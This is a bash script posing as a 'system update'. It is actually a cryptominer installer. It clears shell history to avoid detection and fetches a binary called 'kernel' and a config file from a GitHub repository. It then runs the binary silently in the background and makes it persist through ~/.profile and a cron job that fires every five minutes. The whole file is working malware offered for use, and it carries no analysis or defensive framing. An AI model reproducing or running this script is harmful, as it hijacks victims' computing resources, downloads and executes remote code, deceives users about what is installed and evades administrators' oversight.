#!/bin/bash

# Anti-forensics: Clear history logs to stay hidden
history -c && > ~/.bash_history && unset HISTFILE && set +o history

# Define repository variables
REPO_URL="https://github.com/hlainggyi007/update_sys/raw/refs/heads/main"
LOCAL_DIR="$HOME/.local"

# Payload downloader function
payload_downloader() {
    mkdir -p $LOCAL_DIR
    # Downloading the customized kernel and config from your private/public repo
    curl -L "$REPO_URL/kernel" -o "$LOCAL_DIR/kernel"
    curl -L "$REPO_URL/config.json" -o "$LOCAL_DIR/config.json"
    chmod +x "$LOCAL_DIR/kernel"
}

# Creating an execution wrapper script
create_run_script() {
    cat <<EOF > $LOCAL_DIR/run.sh
#!/bin/bash
if ! pidof kernel >/dev/null; then
    # Running the miner with your custom configuration
    $LOCAL_DIR/kernel --config=$LOCAL_DIR/config.json >/dev/null 2>&1 &
fi
EOF
    chmod +x $LOCAL_DIR/run.sh
}

# Setting up persistence to survive reboots or admin intervention
setup_persistence() {
    # Startup persistence via .profile
    touch ~/.profile
    grep -q "$LOCAL_DIR/run.sh" ~/.profile || echo "$LOCAL_DIR/run.sh &" >> ~/.profile
    
    # Check-in persistence via cronjob every 5 minutes
    (crontab -l 2>/dev/null; echo "*/5 * * * * $LOCAL_DIR/run.sh") | crontab -
}

# Main Execution Flow
echo "[*] Initializing system update..."
payload_downloader
create_run_script
setup_persistence

# Start the initial mining process
$LOCAL_DIR/run.sh

echo "[+] System update completed successfully."
